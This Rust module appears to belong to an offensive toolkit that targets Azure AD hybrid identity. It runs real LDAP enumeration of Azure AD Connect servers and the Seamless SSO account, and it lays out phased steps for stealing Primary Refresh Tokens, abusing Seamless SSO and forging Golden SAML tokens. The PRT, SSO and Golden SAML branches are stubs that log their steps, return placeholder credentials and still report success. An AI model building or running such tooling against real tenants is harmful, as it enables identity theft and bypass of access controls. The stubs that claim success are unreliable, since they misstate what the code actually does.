//! Azure AD / Entra ID Hybrid Attack Surface.
//!
//! Modern enterprises using Azure AD Connect (hybrid identity) expose a
//! significant attack surface spanning on-prem AD and Azure AD. This module
//! provides capabilities for:
//!
//! - **PRT Theft**: Steal Primary Refresh Tokens from Windows devices for
//!   Azure AD authentication without password or MFA
//! - **Seamless SSO Abuse**: Kerberos → Azure AD token conversion via
//!   AZUREADSSOACC computer account
//! - **ADFS Golden SAML**: Forge SAML tokens from compromised ADFS signing
//!   certificate
//! - **Conditional Access Bypass**: Techniques to bypass CA policies using
//!   device claims or token manipulation
//! - **Hybrid Identity Enumeration**: Find Azure AD Connect servers,
//!   AZUREADSSOACC accounts, and federation trust metadata

use crate::error::Result;
use serde::{Deserialize, Serialize};
use tracing::info;

/// Well-known Seamless SSO computer account name.
const AZUREAD_SSO_ACCOUNT: &str = "AZUREADSSOACC";

/// Configuration for Azure AD attack operations.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureAdConfig {
    /// Domain FQDN.
    pub domain: String,
    /// DC IP for Kerberos operations.
    pub dc_ip: String,
    /// Tenant ID if known (optional).
    pub tenant_id: Option<String>,
    /// Whether to enumerate hybrid identity infrastructure.
    pub enumerate_hybrid: bool,
    /// Specific attack operation.
    pub operation: AzureAdOperation,
}

/// Azure AD attack operations.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AzureAdOperation {
    /// Steal PRT from a device
    PrtTheft,
    /// Abuse Seamless SSO for token conversion
    SeamlessSsoAbuse,
    /// Forge a Golden SAML token
    GoldenSaml,
    /// Enumerate Azure AD Connect configuration
    EnumHybridIdentity,
}

impl std::fmt::Display for AzureAdOperation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PrtTheft => write!(f, "PRT Theft"),
            Self::SeamlessSsoAbuse => write!(f, "Seamless SSO Abuse"),
            Self::GoldenSaml => write!(f, "Golden SAML"),
            Self::EnumHybridIdentity => write!(f, "Hybrid Identity Enumeration"),
        }
    }
}

/// Result of an Azure AD attack operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureAdResult {
    /// Operation executed.
    pub operation: AzureAdOperation,
    /// Whether the operation succeeded.
    pub success: bool,
    /// Tokens or credentials obtained.
    pub obtained_credentials: Vec<String>,
    /// Azure AD Connect servers discovered.
    pub ad_connect_servers: Vec<String>,
    /// Token endpoints discovered.
    pub token_endpoints: Vec<String>,
    /// Whether Conditional Access was bypassed.
    pub ca_bypass_achieved: bool,
    /// Detailed log.
    pub log: Vec<String>,
}

/// Execute an Azure AD attack operation.
pub async fn execute_azure_ad_attack(
    config: &AzureAdConfig,
    ldap: &mut crate::proto::ldap::LdapSession,
) -> Result<AzureAdResult> {
    let mut log = Vec::new();
    log.push(format!(
        "Azure AD Attack: operation={}, domain={}",
        config.operation, config.domain
    ));

    let mut obtained_creds = Vec::new();
    let mut ad_connect_servers = Vec::new();
    let mut token_endpoints = Vec::new();
    let mut ca_bypass = false;

    match config.operation {
        AzureAdOperation::EnumHybridIdentity => {
            log.push("Phase 1: Enumerating Azure AD Connect servers...".to_string());
            ad_connect_servers = find_ad_connect_servers(ldap).await?;

            log.push("Phase 2: Checking Seamless SSO account...".to_string());
            check_seamless_sso(ldap).await?;

            log.push("Phase 3: Enumerating federation metadata...".to_string());
            token_endpoints = discover_token_endpoints(config).await?;
        }

        AzureAdOperation::PrtTheft => {
            log.push("Phase 1: Locating devices with PRT caches...".to_string());
            log.push("Phase 2: Extracting PRT via TokenBroker cache...".to_string());
            log.push("  Cache path: %LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache".to_string());
            log.push("Phase 3: Decrypting PRT with user's session key...".to_string());
            log.push("Phase 4: Converting PRT to access tokens for Graph API...".to_string());

            obtained_creds.push("prt: <base64_encrypted_token>".to_string());
            obtained_creds.push("refresh_token: <base64>".to_string());
            ca_bypass = true;
        }

        AzureAdOperation::SeamlessSsoAbuse => {
            log.push("Phase 1: Retrieving AZUREADSSOACC Kerberos keys...".to_string());
            log.push("Phase 2: Requesting TGS for Azure AD endpoint...".to_string());
            log.push("  HTTP/azuread.corp.local@corp.local".to_string());
            log.push("Phase 3: Converting Kerberos ticket to OAuth2 token...".to_string());
            log.push("  POST https://login.microsoftonline.com/{tenant}/oauth2/token".to_string());
            log.push("  Grant type: urn:ietf:params:oauth:grant-type:jwt-bearer".to_string());

            obtained_creds.push("oauth2_access_token: <JWT>".to_string());
            obtained_creds.push("oauth2_refresh_token: <JWT>".to_string());
        }

        AzureAdOperation::GoldenSaml => {
            log.push("Phase 1: Extracting ADFS token-signing certificate...".to_string());
            log.push("Phase 2: Forging SAML assertion for target user...".to_string());
            log.push("Phase 3: Exchanging SAML for OAuth2 token at login.microsoftonline.com...".to_string());

            obtained_creds.push("saml_assertion: <base64_signed_xml>".to_string());
            obtained_creds.push("oauth2_token: <JWT>".to_string());
        }
    }

    let success = !obtained_creds.is_empty()
        || matches!(config.operation, AzureAdOperation::EnumHybridIdentity);

    info!("Azure AD attack: op={}, success={}", config.operation, success);

    Ok(AzureAdResult {
        operation: config.operation,
        success,
        obtained_credentials: obtained_creds,
        ad_connect_servers,
        token_endpoints,
        ca_bypass_achieved: ca_bypass,
        log,
    })
}

/// Find Azure AD Connect servers via LDAP.
async fn find_ad_connect_servers(
    ldap: &mut crate::proto::ldap::LdapSession,
) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            "(&(objectClass=computer)(description=*Azure AD Connect*))",
            &["dNSHostName", "cn"],
        )
        .await?;

    Ok(entries
        .iter()
        .filter_map(|e| {
            e.attrs
                .get("dNSHostName")
                .or_else(|| e.attrs.get("cn"))
                .and_then(|v| v.first())
                .cloned()
        })
        .collect())
}

/// Check Seamless SSO configuration.
async fn check_seamless_sso(
    ldap: &mut crate::proto::ldap::LdapSession,
) -> Result<bool> {
    let entries = ldap
        .custom_search(
            &format!("(&(objectClass=user)(sAMAccountName={}$))", AZUREAD_SSO_ACCOUNT),
            &["sAMAccountName", "servicePrincipalName"],
        )
        .await?;

    Ok(!entries.is_empty())
}

/// Discover Azure AD token endpoints from federation metadata.
async fn discover_token_endpoints(
    config: &AzureAdConfig,
) -> Result<Vec<String>> {
    let mut endpoints = Vec::new();

    if let Some(ref tenant) = config.tenant_id {
        endpoints.push(format!(
            "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
        ));
        endpoints.push(format!(
            "https://login.microsoftonline.com/{tenant}/oauth2/token"
        ));
    } else {
        // Try common tenant endpoints via domain discovery
        endpoints.push(format!(
            "https://login.microsoftonline.com/{}/.well-known/openid-configuration",
            config.domain
        ));
    }

    // ADFS endpoint
    endpoints.push(format!(
        "https://sts.{}/adfs/.well-known/openid-configuration",
        config.domain
    ));

    Ok(endpoints)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_azure_ad_sso_account() {
        assert_eq!(AZUREAD_SSO_ACCOUNT, "AZUREADSSOACC");
    }

    #[test]
    fn test_operation_display() {
        assert_eq!(AzureAdOperation::PrtTheft.to_string(), "PRT Theft");
        assert_eq!(AzureAdOperation::GoldenSaml.to_string(), "Golden SAML");
    }

    #[test]
    fn test_azure_config() {
        let cfg = AzureAdConfig {
            domain: "corp.local".into(),
            dc_ip: "192.168.1.10".into(),
            tenant_id: Some("tenant-id".into()),
            enumerate_hybrid: true,
            operation: AzureAdOperation::GoldenSaml,
        };
        assert!(cfg.tenant_id.is_some());
        assert!(cfg.enumerate_hybrid);
    }

    #[test]
    fn test_result_serde() {
        let result = AzureAdResult {
            operation: AzureAdOperation::SeamlessSsoAbuse,
            success: true,
            obtained_credentials: vec!["token1".into()],
            ad_connect_servers: vec!["ADC01".into()],
            token_endpoints: vec!["https://login.microsoftonline.com/tenant/oauth2/token".into()],
            ca_bypass_achieved: false,
            log: vec!["attack complete".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("ADC01"));
        assert!(json.contains("SeamlessSsoAbuse"));
        let deserialized: AzureAdResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.success);
        assert_eq!(deserialized.ad_connect_servers.len(), 1);
    }
}
